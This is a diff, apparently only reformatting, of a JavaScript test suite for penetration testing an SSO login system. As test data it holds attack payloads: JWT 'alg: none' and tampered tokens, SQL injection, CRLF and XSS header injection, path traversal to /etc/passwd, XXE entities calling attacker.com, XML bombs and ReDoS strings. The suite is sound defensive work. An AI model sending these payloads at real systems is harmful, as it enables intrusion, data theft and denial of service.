@@ -19,17 +19,17 @@ describe('SSO Penetration Testing Scenarios', () => {
     mockDatabase = {
       users: new Map(),
       sessions: new Map(),
-      authEvents: new Map()
+      authEvents: new Map(),
     };
 
     const userRepository = {
-      findByEmail: (email) => Promise.resolve(
-        Array.from(mockDatabase.users.values()).find(user => user.email === email)
-      ),
-      findByProviderId: (providerId) => Promise.resolve(
-        Array.from(mockDatabase.users.values()).find(user => user.providerId === providerId)
-      ),
-      create: (userData) => {
+      findByEmail: email =>
+        Promise.resolve(Array.from(mockDatabase.users.values()).find(user => user.email === email)),
+      findByProviderId: providerId =>
+        Promise.resolve(
+          Array.from(mockDatabase.users.values()).find(user => user.providerId === providerId)
+        ),
+      create: userData => {
         const user = { ...userData, id: `user-${Date.now()}-${Math.random()}` };
         mockDatabase.users.set(user.id, user);
         return Promise.resolve(user);
@@ -41,7 +41,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           return Promise.resolve(user);
         }
         return Promise.resolve(null);
-      }
+      },
     };
 
     jwtProvider = new MockJWTProvider();
@@ -67,13 +67,15 @@ describe('SSO Penetration Testing Scenarios', () => {
           'state&redirect=http://attacker.com',
           'state;DROP TABLE users;--',
           'state||1==1',
-          Buffer.from('malicious').toString('base64')
+          Buffer.from('malicious').toString('base64'),
         ];
 
         for (const maliciousState of maliciousStates) {
           await request(app)
-            .get(`/auth/google/callback?code=valid-code&state=${encodeURIComponent(maliciousState || '')}`)
-            .expect((res) => {
+            .get(
+              `/auth/google/callback?code=valid-code&state=${encodeURIComponent(maliciousState || '')}`
+            )
+            .expect(res => {
               expect([400, 401, 403]).toContain(res.status);
               expect(res.body.error).toBeTruthy();
             });
@@ -95,7 +97,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         await request(app)
           .get(`/auth/google/callback?code=another-code&state=${validState}`)
           .expect(400)
-          .expect((res) => {
+          .expect(res => {
             expect(res.body.error).toContain('already been used');
           });
       });
@@ -129,7 +131,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           'a'.repeat(64),
           states[0].replace(/./g, '0'), // All zeros
           incrementHex(states[0]), // Incremented
-          states[0].slice(0, -1) + '0' // Modified last character
+          states[0].slice(0, -1) + '0', // Modified last character
         ];
 
         for (const predictedState of predictedStates) {
@@ -151,41 +153,51 @@ describe('SSO Penetration Testing Scenarios', () => {
           // Wrong signature
           `${header}.${payload}.wrong-signature`,
           // Algorithm confusion - none algorithm
-          Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64') + '.' + payload + '.',
+          Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64') +
+            '.' +
+            payload +
+            '.',
           // Modified payload with original signature
-          header + '.' + Buffer.from(JSON.stringify({ userId: 'admin' })).toString('base64') + '.' + validToken.split('.')[2]
+          header +
+            '.' +
+            Buffer.from(JSON.stringify({ userId: 'admin' })).toString('base64') +
+            '.' +
+            validToken.split('.')[2],
         ];
 
         for (const token of bypassAttempts) {
-          await request(app)
-            .get('/protected')
-            .set('Authorization', `Bearer ${token}`)
-            .expect(401);
+          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
         }
       });
 
       it('should prevent JWT algorithm confusion attacks', async () => {
         const maliciousTokens = [
           // None algorithm
-          Buffer.from(JSON.stringify({ alg: 'none' })).toString('base64') + '.' +
-          Buffer.from(JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })).toString('base64') + '.',
+          Buffer.from(JSON.stringify({ alg: 'none' })).toString('base64') +
+            '.' +
+            Buffer.from(
+              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
+            ).toString('base64') +
+            '.',
 
           // HMAC with public key
           'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
-          Buffer.from(JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })).toString('base64') +
-          '.signature',
+            Buffer.from(
+              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
+            ).toString('base64') +
+            '.signature',
 
           // Wrong algorithm
-          Buffer.from(JSON.stringify({ alg: 'HS512' })).toString('base64') + '.' +
-          Buffer.from(JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })).toString('base64') +
-          '.signature'
+          Buffer.from(JSON.stringify({ alg: 'HS512' })).toString('base64') +
+            '.' +
+            Buffer.from(
+              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
+            ).toString('base64') +
+            '.signature',
         ];
 
         for (const token of maliciousTokens) {
-          await request(app)
-            .get('/protected')
-            .set('Authorization', `Bearer ${token}`)
-            .expect(401);
+          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
         }
       });
 
@@ -193,7 +205,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         const originalToken = jwtProvider.generateToken({
           userId: 'user-123',
           role: 'user',
-          exp: Math.floor(Date.now() / 1000) + 3600
+          exp: Math.floor(Date.now() / 1000) + 3600,
         });
 
         const [header, , signature] = originalToken.split('.');
@@ -202,12 +214,20 @@ describe('SSO Penetration Testing Scenarios', () => {
           { userId: 'admin', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 },
           { userId: 'user-123', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 },
           { userId: 'user-123', role: 'user', exp: Math.floor(Date.now() / 1000) + 86400 }, // Extended expiry
-          { userId: 'user-123', role: 'user', exp: Math.floor(Date.now() / 1000) + 3600, admin: true }
+          {
+            userId: 'user-123',
+            role: 'user',
+            exp: Math.floor(Date.now() / 1000) + 3600,
+            admin: true,
+          },
         ];
 
         for (const payload of tamperedPayloads) {
-          const tamperedToken = header + '.' +
-            Buffer.from(JSON.stringify(payload)).toString('base64') + '.' +
+          const tamperedToken =
+            header +
+            '.' +
+            Buffer.from(JSON.stringify(payload)).toString('base64') +
+            '.' +
             signature;
 
           await request(app)
@@ -227,7 +247,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           .post('/auth/login')
           .set('Cookie', `sessionId=${fixedSessionId}`)
           .send({ email: 'test@example.com', password: 'password' })
-          .expect((res) => {
+          .expect(res => {
             // Session ID should be regenerated
             const cookies = res.headers['set-cookie'];
             if (cookies) {
@@ -261,14 +281,11 @@ describe('SSO Penetration Testing Scenarios', () => {
           'admin-token',
           '123456789',
           sessions[0].replace(/.$/, '1'), // Modified last character
-          Buffer.from('admin').toString('base64')
+          Buffer.from('admin').toString('base64'),
         ];
 
         for (const token of predictableTokens) {
-          await request(app)
-            .get('/protected')
-            .set('Authorization', `Bearer ${token}`)
-            .expect(401);
+          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
         }
       });
     });
@@ -282,13 +299,13 @@ describe('SSO Penetration Testing Scenarios', () => {
           '/auth/google/callback?code=valid&state=test&state=admin',
           '/auth/google/callback?code=valid&state=test&admin=true',
           '/auth/google/callback?code=valid&state=test&user_id=1',
-          '/auth/google/callback?code=valid&state=test&role=admin'
+          '/auth/google/callback?code=valid&state=test&role=admin',
         ];
 
         for (const url of pollutionAttempts) {
           await request(app)
             .get(url)
-            .expect((res) => {
+            .expect(res => {
               expect([400, 401, 403]).toContain(res.status);
             });
         }
@@ -307,9 +324,9 @@ describe('SSO Penetration Testing Scenarios', () => {
             firstName: 'John',
             role: ['user', 'admin'], // Array pollution
             roles: ['admin'],
-            permissions: ['admin']
+            permissions: ['admin'],
           })
-          .expect((res) => {
+          .expect(res => {
             expect(res.status).not.toBe(200);
             if (res.status === 200) {
               expect(res.body.user?.role).not.toBe('admin');
@@ -328,12 +345,13 @@ describe('SSO Penetration Testing Scenarios', () => {
         const methodOverrideAttempts = [
           { method: 'get', headers: { 'X-HTTP-Method-Override': 'DELETE' } },
           { method: 'post', headers: { 'X-HTTP-Method-Override': 'PUT' } },
-          { method: 'get', headers: { '_method': 'DELETE' } },
-          { method: 'post', body: { _method: 'DELETE' } }
+          { method: 'get', headers: { _method: 'DELETE' } },
+          { method: 'post', body: { _method: 'DELETE' } },
         ];
 
         for (const attempt of methodOverrideAttempts) {
-          const req = request(app)[attempt.method]('/profile')
+          const req = request(app)
+            [attempt.method]('/profile')
             .set('Authorization', `Bearer ${token}`);
 
           if (attempt.headers) {
@@ -346,7 +364,7 @@ describe('SSO Penetration Testing Scenarios', () => {
             req.send(attempt.body);
           }
 
-          await req.expect((res) => {
+          await req.expect(res => {
             // Should not allow method override for destructive operations
             expect(res.status).not.toBe(204); // DELETE success
           });
@@ -361,14 +379,14 @@ describe('SSO Penetration Testing Scenarios', () => {
           'http://legitimate.com\r\n\r\n<script>alert("xss")</script>',
           'http://legitimate.com\nLocation: http://attacker.com',
           'http://legitimate.com%0d%0aSet-Cookie: session=admin',
-          'http://legitimate.com%0a%0d<script>alert(1)</script>'
+          'http://legitimate.com%0a%0d<script>alert(1)</script>',
         ];
 
         for (const payload of headerInjectionPayloads) {
           await request(app)
             .get('/auth/google')
             .query({ redirect_uri: payload })
-            .expect((res) => {
+            .expect(res => {
               expect([400, 403]).toContain(res.status);
 
               // Check that no malicious headers were set
@@ -394,12 +412,10 @@ describe('SSO Penetration Testing Scenarios', () => {
         const maliciousHeaders = {
           'X-Forwarded-For': '127.0.0.1\r\nSet-Cookie: admin=true',
           'User-Agent': 'Browser\r\nLocation: http://attacker.com',
-          'Referer': 'http://site.com\r\n\r\n<script>alert(1)</script>'
+          Referer: 'http://site.com\r\n\r\n<script>alert(1)</script>',
         };
 
-        const req = request(app)
-          .get('/protected')
-          .set('Authorization', `Bearer ${token}`);
+        const req = request(app).get('/protected').set('Authorization', `Bearer ${token}`);
 
         Object.entries(maliciousHeaders).forEach(([key, value]) => {
           req.set(key, value);
@@ -419,7 +435,7 @@ describe('SSO Penetration Testing Scenarios', () => {
 
         const timingTests = [
           { email: 'existing@example.com', password: 'wrong' },
-          { email: 'nonexistent@example.com', password: 'wrong' }
+          { email: 'nonexistent@example.com', password: 'wrong' },
         ];
 
         const timings = [];
@@ -427,10 +443,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         for (const test of timingTests) {
           const start = process.hrtime.bigint();
 
-          await request(app)
-            .post('/auth/login')
-            .send(test)
-            .expect(401);
+          await request(app).post('/auth/login').send(test).expect(401);
 
           const end = process.hrtime.bigint();
           const duration = Number(end - start) / 1000000; // Convert to milliseconds
@@ -448,13 +461,13 @@ describe('SSO Penetration Testing Scenarios', () => {
           { code: 'error-sql-injection', expectedData: 'sql' },
           { code: 'debug-trace-info', expectedData: 'trace' },
           { code: '/etc/passwd', expectedData: 'passwd' },
-          { code: 'admin-credentials', expectedData: 'credentials' }
+          { code: 'admin-credentials', expectedData: 'credentials' },
         ];
 
         for (const attempt of sensitiveDataAttempts) {
           await request(app)
             .get(`/auth/google/callback?code=${attempt.code}&state=test`)
-            .expect((res) => {
+            .expect(res => {
               const responseText = JSON.stringify(res.body).toLowerCase();
               expect(responseText).not.toContain(attempt.expectedData);
               expect(responseText).not.toContain('stack trace');
@@ -471,13 +484,13 @@ describe('SSO Penetration Testing Scenarios', () => {
           '..\\..\\..\\windows\\system32\\config\\sam',
           '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
           '....//....//....//etc//passwd',
-          '..%252f..%252f..%252fetc%252fpasswd'
+          '..%252f..%252f..%252fetc%252fpasswd',
         ];
 
         for (const attempt of traversalAttempts) {
           await request(app)
             .get(`/auth/google/callback?code=test&state=${encodeURIComponent(attempt)}`)
-            .expect((res) => {
+            .expect(res => {
               expect([400, 403, 404]).toContain(res.status);
               const responseText = JSON.stringify(res.body);
               expect(responseText).not.toContain('root:');
@@ -493,7 +506,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         const xxePayloads = [
           '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><samlp:Response>&test;</samlp:Response>',
           '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/collect">]><samlp:Response>&test;</samlp:Response>',
-          '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><samlp:Response></samlp:Response>'
+          '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><samlp:Response></samlp:Response>',
         ];
 
         for (const payload of xxePayloads) {
@@ -501,7 +514,7 @@ describe('SSO Penetration Testing Scenarios', () => {
             .post('/auth/saml/callback')
             .set('Content-Type', 'application/xml')
             .send(payload)
-            .expect((res) => {
+            .expect(res => {
               expect([400, 403, 500]).toContain(res.status);
               const responseText = JSON.stringify(res.body);
               expect(responseText).not.toContain('root:');
@@ -513,7 +526,7 @@ describe('SSO Penetration Testing Scenarios', () => {
       it('should prevent XML bomb attacks', async () => {
         const xmlBombs = [
           '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><samlp:Response>&lol3;</samlp:Response>',
-          '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><samlp:Response>&c;</samlp:Response>'
+          '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><samlp:Response>&c;</samlp:Response>',
         ];
 
         for (const bomb of xmlBombs) {
@@ -524,7 +537,7 @@ describe('SSO Penetration Testing Scenarios', () => {
             .set('Content-Type', 'application/xml')
             .timeout(5000)
             .send(bomb)
-            .expect((res) => {
+            .expect(res => {
               const processingTime = Date.now() - startTime;
               // Should not take excessive time to process (DOS protection)
               expect(processingTime).toBeLessThan(2000);
@@ -541,14 +554,14 @@ describe('SSO Penetration Testing Scenarios', () => {
         const largePayloads = [
           { field: 'email', value: 'a'.repeat(1000000) }, // 1MB email
           { field: 'firstName', value: 'b'.repeat(500000) }, // 500KB name
-          { field: 'state', value: 'c'.repeat(100000) } // 100KB state
+          { field: 'state', value: 'c'.repeat(100000) }, // 100KB state
         ];
 
         for (const payload of largePayloads) {
           await request(app)
             .post('/auth/register')
             .send({ [payload.field]: payload.value })
-            .expect((res) => {
+            .expect(res => {
               expect([400, 413]).toContain(res.status);
             });
         }
@@ -559,7 +572,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           'a'.repeat(50000) + '!', // ReDoS attempt
           'x'.repeat(10000) + 'x'.repeat(10000) + '!',
           '((((((((((a' + 'a'.repeat(100) + ')',
-          'a' + 'a?'.repeat(20) + 'a'.repeat(20)
+          'a' + 'a?'.repeat(20) + 'a'.repeat(20),
         ];
 
         for (const payload of regexDosPayloads) {
@@ -569,7 +582,7 @@ describe('SSO Penetration Testing Scenarios', () => {
             .post('/auth/login')
             .send({ email: `${payload}@example.com`, password: 'test' })
             .timeout(2000)
-            .expect((res) => {
+            .expect(res => {
               const processingTime = Date.now() - startTime;
               expect(processingTime).toBeLessThan(1000); // Should not take too long
               expect([400, 422]).toContain(res.status);
@@ -606,7 +619,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           { 'X-Real-IP': '192.168.1.1' },
           { 'X-Originating-IP': '10.0.0.1' },
           { 'X-Remote-IP': '172.16.0.1' },
-          { 'X-Client-IP': '203.0.113.1' }
+          { 'X-Client-IP': '203.0.113.1' },
         ];
 
         const email = 'ratelimit@example.com';
@@ -638,7 +651,7 @@ describe('SSO Penetration Testing Scenarios', () => {
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
           'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
-          'Mozilla/5.0 (Android 11; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0'
+          'Mozilla/5.0 (Android 11; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0',
         ];
 
         let totalRequests = 0;
@@ -682,23 +695,20 @@ describe('SSO Penetration Testing Scenarios', () => {
                 email,
                 password: 'password123',
                 firstName: 'Race',
-                lastName: 'Condition'
+                lastName: 'Condition',
               })
               .catch(() => {}) // Ignore individual failures
           );
         }
 
         const results = await Promise.allSettled(promises);
-        const successful = results.filter(r =>
-          r.status === 'fulfilled' && r.value.status === 201
-        );
+        const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 201);
 
         // Only one user creation should succeed
         expect(successful.length).toBe(1);
 
         // Verify only one user exists in database
-        const users = Array.from(mockDatabase.users.values())
-          .filter(user => user.email === email);
+        const users = Array.from(mockDatabase.users.values()).filter(user => user.email === email);
         expect(users.length).toBe(1);
       });
 
@@ -722,9 +732,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         }
 
         const results = await Promise.allSettled(promises);
-        const successful = results.filter(r =>
-          r.status === 'fulfilled' && r.value.status === 200
-        );
+        const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 200);
 
         // Only one link operation should succeed
         expect(successful.length).toBeLessThanOrEqual(1);
@@ -750,7 +758,7 @@ describe('SSO Penetration Testing Scenarios', () => {
 
         const [adminResult, escalationResult] = await Promise.allSettled([
           adminRequest,
-          privilegeEscalation
+          privilegeEscalation,
         ]);
 
         // Admin operation should fail regardless of privilege escalation timing
@@ -770,16 +778,16 @@ describe('SSO Penetration Testing Scenarios', () => {
         const poisoningAttempts = [
           { 'X-Forwarded-Host': 'attacker.com' },
           { 'X-Forwarded-Proto': 'javascript' },
-          { 'Host': 'attacker.com' },
+          { Host: 'attacker.com' },
           { 'X-Original-URL': '/admin/backdoor' },
-          { 'X-Rewrite-URL': '/admin/config' }
+          { 'X-Rewrite-URL': '/admin/config' },
         ];
 
         for (const headers of poisoningAttempts) {
           await request(app)
             .get('/auth/google')
             .set(headers)
-            .expect((res) => {
+            .expect(res => {
               if (res.headers.location) {
                 expect(res.headers.location).not.toContain('attacker.com');
                 expect(res.headers.location).not.toContain('javascript:');
@@ -795,7 +803,7 @@ describe('SSO Penetration Testing Scenarios', () => {
         const victim = UserFactory.create({
           email: 'victim@example.com',
           isVerified: false,
-          verificationToken: 'victim-token'
+          verificationToken: 'victim-token',
         });
         mockDatabase.users.set(victim.id, victim);
 
@@ -806,14 +814,14 @@ describe('SSO Penetration Testing Scenarios', () => {
           victim.id,
           Buffer.from(victim.id).toString('base64'),
           'victim-token' + '0',
-          '../victim-token'
+          '../victim-token',
         ];
 
         for (const token of bypassAttempts) {
           await request(app)
             .post('/auth/verify-email')
             .send({ token })
-            .expect((res) => {
+            .expect(res => {
               if (res.status === 200) {
                 // If verification succeeds, it should be the legitimate token
                 expect(token).toBe('victim-token');
@@ -833,14 +841,14 @@ describe('SSO Penetration Testing Scenarios', () => {
           { email: 'admin@example.com' },
           { email: 'admin@example.com', userId: admin.id },
           { email: 'admin@example.com', role: 'admin' },
-          { email: 'admin@example.com', bypass: 'true' }
+          { email: 'admin@example.com', bypass: 'true' },
         ];
 
         for (const attempt of resetAttempts) {
           await request(app)
             .post('/auth/forgot-password')
             .send(attempt)
-            .expect((res) => {
+            .expect(res => {
               // Should either succeed normally (200) or fail (400/401)
               // But should not grant special privileges
               expect([200, 400, 401]).toContain(res.status);
@@ -967,7 +975,7 @@ function setupPenetrationTestRoutes(app, ssoService) {
         id: `google-${Math.random().toString(36).substring(2)}`,
         email: `${code.substring(0, 10)}@example.com`,
         name: 'Test User',
-        verified_email: true
+        verified_email: true,
       };
 
       const user = await ssoService.handleOAuthCallback('google', mockProfile);
@@ -978,13 +986,13 @@ function setupPenetrationTestRoutes(app, ssoService) {
         userId: user.id,
         created: Date.now(),
         ipAddress: req.ip,
-        userAgent: req.get('User-Agent')
+        userAgent: req.get('User-Agent'),
       });
 
       res.cookie('sessionToken', sessionToken, {
         httpOnly: true,
         secure: false, // Would be true in production
-        sameSite: 'strict'
+        sameSite: 'strict',
       });
 
       res.redirect('/dashboard');
@@ -1021,8 +1029,9 @@ function setupPenetrationTestRoutes(app, ssoService) {
     // Always perform password hashing operation to maintain consistent timing
     const dummyHash = crypto.scryptSync('dummy', 'salt', 64);
 
-    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || [])
-      .find(u => u.email === email);
+    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || []).find(
+      u => u.email === email
+    );
 
     if (!user || user.password !== password) {
       return res.status(401).json({ error: 'Invalid credentials' });
@@ -1059,7 +1068,7 @@ function setupPenetrationTestRoutes(app, ssoService) {
         firstName,
         lastName,
         isVerified: false,
-        verificationToken: crypto.randomBytes(32).toString('hex')
+        verificationToken: crypto.randomBytes(32).toString('hex'),
       });
 
       res.status(201).json({ message: 'User created', userId: user.id });
@@ -1135,8 +1144,9 @@ function setupPenetrationTestRoutes(app, ssoService) {
     }
 
     // In a real implementation, this would verify the token securely
-    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || [])
-      .find(u => u.verificationToken === token);
+    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || []).find(
+      u => u.verificationToken === token
+    );
 
     if (!user) {
       return res.status(400).json({ error: 'Invalid or expired verification token' });
